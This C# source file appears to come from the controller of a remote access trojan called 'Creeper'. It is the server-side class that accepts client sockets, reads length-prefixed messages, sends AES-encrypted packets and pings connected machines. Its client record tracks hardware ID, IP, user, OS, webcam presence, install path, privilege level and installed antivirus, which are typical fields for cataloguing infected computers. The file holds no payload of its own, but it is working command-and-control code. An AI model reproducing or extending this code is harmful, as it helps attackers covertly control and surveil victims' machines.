﻿using Creeper.HandlePacket;
using MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace Creeper.Connection
{
    public class Clients
    {
        public Socket ClientSocket { get; set; }
        public ListViewItem LV { get; set; }
        private byte[] ClientBuffer { get; set; }
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; } = new object();
        private object EndSendSync { get; } = new object();
        public long BytesRecevied { get; set; }

        public ClientInfo Info { get; set; }

        public class ClientInfo
        {
            public string HWID;
            public string IP;
            public string User;
            public string OS;
            public string Camera;
            public string InstallTime;
            public string Path;
            public string Active;
            public string Version;
            public string Permission;
            public string AV;
            public string Group;
            public int ClrVersion;
            public DateTime LastPing;
        }

        public Clients(Socket socket)
        {
            ClientSocket = socket;
            ClientBuffer = new byte[4];
            ClientMS = new MemoryStream();
            Info = new ClientInfo();
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }
                else
                {
                    int Recevied = ClientSocket.EndReceive(ar);
                    if (Recevied > 0)
                    {
                        if (!ClientBufferRecevied)
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
                            ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                            ClientMS.Dispose();
                            ClientMS = new MemoryStream();
                            if (ClientBuffersize > 0)
                            {
                                ClientBuffer = new byte[ClientBuffersize];
                                Debug.WriteLine("/// Server Buffersize " + ClientBuffersize.ToString() + " Bytes  ///");
                                ClientBufferRecevied = true;
                            }
                        }
                        else
                        {
                            await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                            BytesRecevied += Recevied;
                            if (ClientMS.Length == ClientBuffersize)
                            {
                                ThreadPool.QueueUserWorkItem(Packet.Read, new object[] { ClientMS.ToArray(), this });
                                ClientBuffer = new byte[4];
                                ClientMS.Dispose();
                                ClientMS = new MemoryStream();
                                ClientBufferRecevied = false;
                            }
                            else
                                ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                        ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
                    }
                    else
                    {
                        Disconnected();
                        return;
                    }
                }
            }
            catch
            {
                Disconnected();
                return;
            }
        }

        public void Disconnected()
        {
            try
            {
                if (LV != null)
                {
                    FormMain.childForm_Home.Invoke((MethodInvoker)(() =>
                    {
                        lock (Setting.LockListviewClients)
                        {
                            LV.Remove();
                            FormMain.childForm_Home.AppandLog(Info.HWID + ": Client disconnected !");
                        }
                    }));
                }
            }
            catch { }

            try
            {
                if (ClientSocket.Connected)
                {
                    ClientSocket.Shutdown(SocketShutdown.Both);
                }
            }
            catch { }

            try
            {
                ClientSocket?.Dispose();
                ClientMS?.Dispose();
            }
            catch { }
        }

        public void BeginSend(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;

                    byte[] buffer = Helper.Aes.Encrypt((byte[])msg);
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Disconnected();
                    return;
                }

            }
        }

        private void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    int sent = 0;
                    sent = ClientSocket.EndSend(ar);
                    Debug.WriteLine("/// Server Sent " + sent.ToString() + " Bytes  ///");
                }
                catch
                {
                    Disconnected();
                    return;
                }
            }
        }

        public void Ping(object obj)
        {
            lock (SendSync)
            {
                lock (EndSendSync)
                {
                    try
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "Ping";
                        msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                        byte[] buffer = Helper.Aes.Encrypt(msgpack.Encode2Bytes());
                        byte[] buffersize = BitConverter.GetBytes(buffer.Length);
                        ClientSocket.Poll(-1, SelectMode.SelectWrite);
                        ClientSocket.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
                        ClientSocket.Send(buffer, 0, buffer.Length, SocketFlags.None);
                    }
                    catch
                    {
                        Disconnected();
                        return;
                    }
                }
            }
        }

    }
}